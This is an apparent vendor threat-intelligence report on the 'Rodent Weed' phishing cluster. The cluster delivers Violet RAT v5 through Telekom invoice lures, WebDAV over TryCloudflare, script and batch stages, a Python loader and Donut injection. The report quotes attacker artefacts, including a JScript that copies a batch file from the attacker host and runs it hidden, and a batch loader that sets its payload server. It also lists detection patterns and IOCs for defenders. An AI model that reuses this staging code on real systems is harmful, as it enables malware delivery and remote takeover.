Threat activity clusters rarely remain static over time. Delivery methods, lure formats, and payload choices often change between campaigns, while the underlying tradecraft remains stable enough to support tracking and detection. 
This report covers activity that Telekom Security tracks as Rodent Weed. We have monitored this cluster since 2024 and across observed campaigns, the first-stage wrapper has varied, including SVG attachments, HTML files, and, more recently, Dropbox links. Some campaigns presented victims with a convincing decoy PDF, while others omitted the decoy entirely. The final payload has also rotated across commodity remote access trojans (RATs) and information stealers.

Despite these variations, the core execution chain has remained consistent. A document-themed lure transitions the victim from the browser to Windows Explorer, where a WebDAV share is accessed via a temporary TryCloudflare tunnel. A shortcut or script then initiates the next stage, batch files prepare the environment, a portable Python runtime is deployed to disk, and the final payload is executed in memory. <!--more-->

## Rodent Weed - Cluster Definition and Observed Tradecraft

Rodent Weed is the tracking name Telekom Security uses for a recurring phishing operation observed since 2024. The activity has continued to evolve over time, with changes to lure formats, delivery wrappers, and final payloads. This report represents the latest checkpoint in that ongoing tracking effort.

Across observed campaigns, Rodent Weed has primarily varied the initial wrapper and final payload, while the intermediate staging and execution workflow has remained largely consistent.

In 2024, the activity was observed using SVG attachments as the initial wrapper. These files contained a small amount of Base64-encoded JScript that displayed a decoy PDF and directed the victim to a WebDAV share opened in Windows Explorer. From there, a .pdf.lnk file using an invoice-themed filename downloaded Python and executed the payload.
In early 2025, the operator introduced new wrapper formats in quick succession. One campaign used an HTML file assessed as likely abusing CVE-2024-38213 to bypass Mark-of-the-Web protections before reaching a similar WebDAV share and deploying both DcRAT and AsyncRAT. Another campaign used a ZIP archive containing a .url shortcut, which led through a .pdf.lnk file and VBScript before delivering XWorm and AsyncRAT.

By mid-2025, Dropbox began appearing as the hosting infrastructure, while the campaigns continued to rotate across commodity RAT payloads.

By December 2025 the chain had grown an extra hop or two, a Dropbox `.pdf.zip` opening a `.pdf.lnk`, then a `.wsh`, a `.wsf`, VBScript, and a batch loader, and it finished by dropping four binaries at once, a stealer, two copies of XWorm, and AsyncRAT. In March 2026 a Telekom-themed wave put a convincing decoy PDF back in front of the victim and labelled its payloads by role, stager, startup, and malware.

Across these waves, the intermediate staging and execution workflow remained largely consistent. Explorer opens a WebDAV share over a TryCloudflare tunnel, a script and batch chain unrolls, a portable Python runtime lands, and Donut runs the real payload in memory. Only the wrapper and the final RAT typically change.

This recurring pattern is also visible outside our own telemetry. Other vendors have independently documented overlapping delivery chains over the past year. Forcepoint X-Labs described the Dropbox to TryCloudflare WebDAV to Python variant in early 2025. Trend Micro published a multi-stage analysis in January 2026 that lines up closely with what we have seen, though we did not observe the browser cookie injection they reported. This difference reinforces that individual waves can vary in implementation details. Securonix documented the embedded Python loader and in-memory injection into `explorer.exe` under the name VOID#GEIST, and SonicWall analyzed a Violet RAT campaign built on the same multi-stage Python loader, calling home on the same C2 port we observed here. Links are in [Related reporting](#related-reporting).

## Key Observations

The campaign analyzed in this report was observed in late March 2026 and used Telekom invoice-themed phishing emails to deliver Violet RAT v5. The execution chain from initial lure to C2 communication is described below.

The victim received a phishing email containing a link to a Dropbox-hosted ZIP archive, which contained a single Windows Internet Shortcut (.url). When opened, the shortcut directed Windows Explorer to a WebDAV share exposed through a temporary TryCloudflare tunnel, where a PDF-disguised shortcut initiated the next stage of execution. From that point, the chain progressed through Windows Script Host (WSH), JScript, batch files, an embedded Python runtime including a Python loader, and Donut-based injection into explorer.exe.

The Python loader established persistence via the Startup folder and ultimately delivered Violet RAT v5, which connected to `91.219.238[.]140:7000`, transmitted an encrypted system profile, and then entered a recurring heartbeat loop.

Two aspects distinguish this case from previous waves. First, the final payload is Violet RAT v5, marking the first time we have observed this RAT at the end of a Rodent Weed execution chain. Second, the decoy PDF is absent. Earlier Telekom-themed campaigns usually opened a convincing decoy PDF to reduce suspicion while the chain ran, as recently as the February wave. Instead of presenting a benign-looking PDF, the analyzed case proceeds directly to the next execution stage after the victim opens the shortcut. Despite this behavioural change, the subsequent execution chain remained consistent with previously observed Rodent Weed activity.

One detail is worth flagging early. The phishing email used a Telekom-themed lure, while the file hosted on the WebDAV share was named `DKM_00KS0095283.PDF.lnk`. Previous Rodent Weed analysis has also identified filenames that did not align with the lure theme, including a DATEV-themed filename for example `DATEV-Rechnung-Nr.381082026.wsh`. It suggests the operator reused the same infrastructure and file set across more than one lure. 

Figure 1 summarizes the observed infection chain, from the initial Telekom-themed lure to Violet RAT v5 execution and C2 communication.

## Chain of Execution

### From the invoice mail to a WebDAV folder

The observed email impersonated Deutsche Telekom with an invoice lure and link to a ZIP archive (`Telekom_3426503572.zip`) hosted on Dropbox. The archive did not contain an invoice but a single Windows Internet Shortcut file (`.url`), leaving the victim with only one visible item which further reinforced the appearance that a document had been delivered.

Subject: `Ihre Telekom Festnetz-Rechnung Oktober 2025 (Buchungskonto:5605355625)`  
Sender: `Telekom Deutschland GmbH {NoReply} <brendawolfe403[@]gasatmail[.]site>`

Figure 2 shows the observed Telekom-themed phishing email, which included fabricated invoice-related identifiers such as customer and invoice numbers to increase credibility. These lure-specific values are redacted in the screenshot.

![Phishing email with Telekom invoice lure](/assets/images/RodentWeed/mail.png){: .img-xs }

<p class="img-caption">Figure 2. Telekom-themed phishing email that started the analyzed chain</p>

The `.url` file pointed to a WebDAV resource using the Windows `file://` URL format and the `@SSL` suffix.

```ini
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,9
[InternetShortcut]
IDList=
HotKey=0
URL=file://move-friendly-international-observed.trycloudflare[.]com@SSL/DavWWWRoot/dokumente?config=eyJwYXRoIjoiY29uZmlkZW50aWFsIiwibW9kZSI6InJlYWQifQ%3D%3D
```
<p class="code-caption">File 1. Telekom_3426503572.url</p>

{: .space-before-sm}

The URL also included a Base64-encoded JSON parameter.

```json
{"path":"confidential","mode":"read"}
```

{: .space-before-sm}

This parameter does not appear to be required for standard WebDAV access. Based on the observed behaviour, it is likely decorative, operator-specific, or intended as light obfuscation.

The important part is how the chain reduces user suspicion and avoids browser-mediated download handling. The victim never lands on a normal web page. Windows Explorer opens the remote WebDAV location and presents it as if it were an ordinary folder. The cloud link is presented as a local-looking file browser, while browser-mediated download prompts and reputation checks are less visible to the victim.

Hosting the share behind `trycloudflare.com` lets the operator expose a backend service over a temporary HTTPS tunnel without ever registering their own domain. Blocking the resolved Cloudflare edge IPs is not recommended, as this is unlikely to remain effective and may disrupt unrelated legitimate services that rely on the same shared Cloudflare infrastructure. Domain pattern, URL pattern, WebDAV, and process chain detections are far more durable. During manual analysis, the WebDAV endpoint exposed a directory listing, as shown in Figure 3. This allowed the hosted files to be reviewed directly before reconstructing the subsequent execution chain.

![First WebDAV directory view](/assets/images/RodentWeed/1_webdav.png){: .img-small }

<p class="img-caption">Figure 3. WebDAV directory listing observed during manual analysis</p>

### The PDF disguised as a shortcut

The WebDAV share presented a single visible file, `DKM_00KS0095283.PDF.lnk`. The name and icon were chosen to look like a PDF document but instead it was a Windows Shortcut that executed `wscript.exe` to run a JScript file hosted on the same WebDAV folder. Separately, the same TryCloudflare-backed WebDAV infrastructure also exposed additional files in the parent directory. Figure 4 shows this parent directory view, which was reviewed during manual analysis and helped identify files used by later stages of the chain.


![Second WebDAV directory view showing the fake PDF LNK](/assets/images/RodentWeed/2_webdav.png){: .img-small }

<p class="img-caption">Figure 4. Parent WebDAV directory exposing additional files used in the execution chain</p>

The shortcut metadata confirms that the apparent PDF was built to invoke Windows Script Host and execute a remote script from the same WebDAV location.

Relevant shortcut metadata

| Field | Value | Interpretation |
|---|---|---|
| Arguments | `//B \\move-friendly-international-observed.trycloudflare[.]com@SSL\DavWWWRoot\oa.wsh` | Executes a WSH file from WebDAV |
| Icon index | `11` | Visual masquerading as a PDF |
| Working directory | `C:\Windows\System32` | Ensures `wscript.exe` resolves correctly |
| Machine ID | `ec2amaz-vjnf8l9` | Consistent with an AWS EC2 Windows hostname pattern |

{: .space-before-sm}

The machine ID may provide a useful pivot point for further investigation. However, as it can be manipulated, it should be considered a low-confidence indicator. We currently have no supporting data to validate or correlate this identifier with other artefacts.

### A short hop through WSH and JScript

The first script stage was `oa.wsh`, a small redirection layer that simply pointed to `ccv.js` on the same WebDAV share.

```ini
[ScriptFile]
Path=\\move-friendly-international-observed.trycloudflare[.]com@SSL\DavWWWRoot\ccv.js
[Options]
Timeout=0
```
<p class="code-caption">File 2. oa.wsh</p>
{: .space-before-sm}

This redirection keeps the shortcut command line concise and separates the primary execution logic from the LNK file. The `ccv.js` script then used Windows Script Host automation objects to copy `final.bat` from the WebDAV share to the local temporary directory and execute it in a hidden window.

```javascript
with(new ActiveXObject("WScript.Shell")) {
   var target = ExpandEnvironmentStrings("%TEMP%\\r.bat");
   new ActiveXObject("Scripting.FileSystemObject").CopyFile(
       "\\\\move-friendly-international-observed.trycloudflare[.]com@SSL\\DavWWWRoot\\final.bat",
       target);
   Run("\"" + target + "\"", 0);
}
```
<p class="code-caption">File 3. ccv.js</p>

{: .space-before-sm}

By this point the process chain looks like this, which is itself a useful detection trail.

```text
explorer.exe
  -> wscript.exe
    -> ccv.js from WebDAV
      -> %TEMP%\r.bat
```

### Batch staging and a portable Python runtime

`final.bat` relaunched itself hidden through PowerShell and created its working directory in ``%APPDATA%\Microsoft\Windows\Crypto\RSA\Cache\`` as shown in the code snippet below.

```batch
@echo off
if "%~1"=="hidden" goto main
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit

:main
set PYTHON_VERSION=3.11.8
set ARCH=amd64
set "BASEDIR=%APPDATA%\Microsoft\Windows\Crypto\RSA\Cache"
if not exist "%BASEDIR%" mkdir "%BASEDIR%"
set ZIPFILE=%BASEDIR%\python_embed.zip
set PACKAGE_ZIP=%BASEDIR%\files.zip
set PERSISTENCE_SCRIPT=%BASEDIR%\add_to_startup.bat
set GETPIP=%BASEDIR%\get-pip.py
set LOGFILE=%BASEDIR%\setup.log
set SERVER_URL=https://move-friendly-international-observed.trycloudflare.com
set PACKAGE_FILE=files.zip
set PERSISTENCE_FILE=add_to_startup.bat
set PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-embed-%ARCH%.zip
set GETPIP_URL=https://bootstrap.pypa.io/get-pip.py
......

```
<p class="code-caption">File 4. final.bat Snippet</p>

{: .space-before-sm}

The path is writable by the user but resembles legitimate Windows cryptographic storage, which makes it a convenient place to hide in plain sight. From there the loader installed a portable Python 3.11.8 runtime, installed the dependencies it needed, downloaded the encrypted payload package, and executed `encrypted_loader.py`.

These files ended up in the staging directory.

| File | Purpose |
|---|---|
| `encrypted_loader.py` | Python shellcode loader |
| `as_encrypted.bin` | AES CBC encrypted shellcode |
| `as_key.bin` | 32 byte AES key followed by a 16 byte IV |
| `setup.log` | Execution log written by the loader chain |

### Artifacts Created During Loader Execution

One of the more useful artefacts recovered during sandbox analysis was `setup.log`, written to the staging directory.

```text
%APPDATA%\Microsoft\Windows\Crypto\RSA\Cache\setup.log
```

{: .space-before-sm}

The log ties the whole chain together. It records the setup of the embedded Python environment, the installation of dependencies, the extraction of the loader package, the download of the persistence script, and the final execution of `encrypted_loader.py` against `as_encrypted.bin` with `explorer.exe` as the injection target.

```text

```
<p class="code-caption">File 5. setup.log</p>

{: .space-before-sm}

For defenders, the verbose logging is valuable, confirming that Python was downloaded, dependencies were installed, the package was extracted, persistence was staged, and shellcode execution finished with exit code `0`.

### Persistence

Persistence was established through the current user’s Startup folder.

```text
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\CryptoLoader.lnk
```

{: .space-before-sm}

The shortcut launched `cmd.exe`, changed into the staging directory, and ran the Python loader again. No registry Run key persistence was observed in this execution chain. Persistence was file-based and limited to the user profile.

```text
Operating System      : Windows 8.1, 10
Target File Name      : cmd.exe
Description           : Windows Crypto Loader

```
<p class="code-caption">Output 1. ExifTool excerpt - CryptoLoader.lnk</p>

### Decryption and injection into explorer.exe

`encrypted_loader.py` read two local files, the AES CBC encrypted shellcode in `as_encrypted.bin` and the key material in `as_key.bin` (the 32 byte key plus 16 byte IV). After decryption, the loader identified the running `explorer.exe` process and used standard Windows process injection APIs, allocating remote memory, writing the process memory, and creating a remote thread.

The decrypted shellcode was identified as a Donut payload, which loaded the embedded Violet RAT v5 .NET assembly directly into memory. Donut is a shellcode generator commonly used to execute .NET assemblies and other payloads in-memory without writing the final stage to disk. To inspect and extract the embedded payload, we used the <a href="https://github.com/volexity/donut-decryptor" target="_blank" rel="noopener noreferrer">donut-decryptor</a> tool published by Volexity. 

### Violet RAT v5 as the final payload

The decompiled Violet RAT v5 stub contained several high-signal artifacts.

| Artifact | Value |
|---|---|
| C2 IP | `91.219.238[.]140` |
| C2 port | `7000/TCP` |
| Internal version | `Violet v5` |
| Mutex | `LApYAYSFOShHukHW` |
| Protocol delimiter | `<Violet>` |
| C2 packet label | `INFO` |
| Heartbeat | Client sends `PING?`, server responds `PING!` |
| C2 encryption | AES/Rijndael ECB using a key derived from `XSXSXSX` |
| XOR key | `TIeuNzM` |

{: .space-before-sm}

The initial C2 message contained a full system profile, including user name, operating system, privilege state, antivirus status, and the internal RAT version. The observed decrypted traffic confirmed successful communication with the C2 server during analysis.

The client to server message looked like this.

```text
INFO<Violet>XXXXXXXXXXXXXXXXXXXX<Violet>Admin<Violet>Windows 11 Pro 64bit<Violet>Violet v5
<Violet>22/03/2022<Violet>True<Violet>False<Violet>None<Violet>Nothing<Violet>Nothing
```

{: .space-before-sm}

Subsequent outbound traffic was the periodic heartbeat, `PING?` from the client answered with `PING!` from the server. The date value `22/03/2022` in the decrypted client profile appears to reflect host-derived operating system installation information and should not be interpreted as a campaign timestamp.

Violet RAT v5 is advertised as a commercial remote administration tool by the developer using the handle `@n0xi0s`, on websites such as `violetrat[.]net` and `violetsoftware[.]net`. Although the author presents Violet RAT v5 as dual-use software, its functionality aligns more closely with an offensive remote access tool than with legitimate administrative tooling. In the campaign analyzed here, Violet RAT v5 was used as the final payload in a phishing-driven malware chain.

## Detection and hunting opportunities

The observed execution chain provides defenders with several hunting opportunities across network, host, and filesystem telemetry. The most durable detections are behavioural. Single domains and IP addresses change quickly, but the behavioural sequence from shortcut execution to WebDAV access, script staging, Python execution, and process injection is harder to replace without reworking the operation.

### Network

- Connections to `91.219.238[.]140:7000/TCP`
- Access to `*.trycloudflare.com` using WebDAV-style paths
- Windows clients accessing `DavWWWRoot` over HTTPS from Explorer or script hosts
- Dropbox downloads followed by `.url` or `.lnk` execution

### Host

High signal process patterns

```text
explorer.exe -> wscript.exe
wscript.exe -> cmd.exe
wscript.exe -> powershell.exe
cmd.exe -> powershell.exe -WindowStyle Hidden
cmd.exe -> python.exe
python.exe -> explorer.exe injection indicators
```

{: .space-before-sm}

Additional behavioural detections

- `.url` files opening remote `file://` paths with `@SSL` and `DavWWWRoot`
- `.lnk` files with PDF masquerading that execute `wscript.exe`
- Script execution from WebDAV UNC paths
- Portable Python runtimes installed below user-writable directories that resemble Windows system paths
- Startup folder shortcuts launching command interpreters or Python loaders
- Remote thread creation into `explorer.exe` from a Python process

### Filesystem

Observed paths and files

## Recommendations

1. Hunt for execution through WebDAV from `.url` and `.lnk` files, especially paths using `DavWWWRoot` and `*.trycloudflare.com`.
2. Monitor script chains involving `wscript.exe`, `cscript.exe`, `powershell.exe`, `cmd.exe`, and portable Python runtimes launched from user-writable directories.
3. Detect persistence through Startup folder shortcuts that launch `cmd.exe`, Python, or scripts from `%APPDATA%`.
4. Hunt for the staging directory `%APPDATA%\Microsoft\Windows\Crypto\RSA\Cache\` and the filenames listed in the IOC section.
5. Block or monitor the observed C2 endpoint and related delivery infrastructure.
6. Treat cloud hosted archives that contain shortcut files as high risk, especially when paired with invoice themed social engineering.
